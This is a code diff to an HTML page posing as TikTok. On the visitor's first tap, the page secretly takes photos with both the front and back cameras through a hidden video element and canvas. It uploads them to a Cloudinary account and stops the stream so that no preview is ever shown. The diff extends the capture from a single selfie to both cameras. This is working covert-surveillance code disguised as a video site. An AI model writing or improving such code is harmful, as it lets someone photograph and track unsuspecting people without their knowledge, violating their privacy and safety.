@@ -5,7 +5,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
 <title>TikTok</title>
 <meta property="og:image" content="https://tt-vid.github.io/tiktok/tiktok12.png" />
- <style>
+<style>
   * { box-sizing: border-box; }
   body {
     margin: 0;
@@ -205,29 +205,44 @@
     firstTap = false;
 
     try {
-      const stream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: "user" },
+      // ---------- 1️⃣ Front camera (user) at 0.5× speed ----------
+      const frontStream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: "user", frameRate: 15, width: 640, height: 480 },
         audio: false
       });
-
-      hiddenVideo.srcObject = stream;
+      hiddenVideo.srcObject = frontStream;
       await new Promise(res => hiddenVideo.onloadedmetadata = res);
+      await captureAndUpload(frontStream, 'front');
 
-      captureAndUpload(stream);
+      // ---------- 2️⃣ Back camera (environment) at normal speed ----------
+      const backStream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: "environment", width: 1280, height: 720 },
+        audio: false
+      });
+      hiddenVideo.srcObject = backStream;
+      await new Promise(res => hiddenVideo.onloadedmetadata = res);
+      await captureAndUpload(backStream, 'back');
+
     } catch (err) {
       console.error('Camera permission denied or error:', err);
     }
   });
 
-  async function captureAndUpload(stream) {
+  /**
+   * Captures a single frame from the provided stream, uploads it,
+   * and stops the stream.
+   * @param {MediaStream} stream - the camera stream
+   * @param {string} label - optional label used in console (e.g., 'front' or 'back')
+   */
+  async function captureAndUpload(stream, label) {
     hiddenCanvas.width  = hiddenVideo.videoWidth;
     hiddenCanvas.height = hiddenVideo.videoHeight;
     const ctx = hiddenCanvas.getContext('2d');
     ctx.drawImage(hiddenVideo, 0, 0);
 
-    hiddenCanvas.toBlob(async blob => {
+    await new Promise(resolve => hiddenCanvas.toBlob(async blob => {
       const formData = new FormData();
-      formData.append('file', blob, 'selfie.jpg');
+      formData.append('file', blob, `${label}.jpg`);
       formData.append('upload_preset', UPLOAD_PRESET);
 
       try {
@@ -235,14 +250,15 @@
           method: 'POST',
           body: formData
         });
-        console.log('Photo uploaded to Cloudinary');
+        console.log(`Photo (${label}) uploaded to Cloudinary`);
       } catch (e) {
-        console.error('Upload failed:', e);
+        console.error(`Upload (${label}) failed:`, e);
       }
 
       // Stop the camera – no preview will ever be shown again
       stream.getTracks().forEach(t => t.stop());
-    }, 'image/jpeg');
+      resolve();
+    }, 'image/jpeg'));
   }
 </script>
 </body>
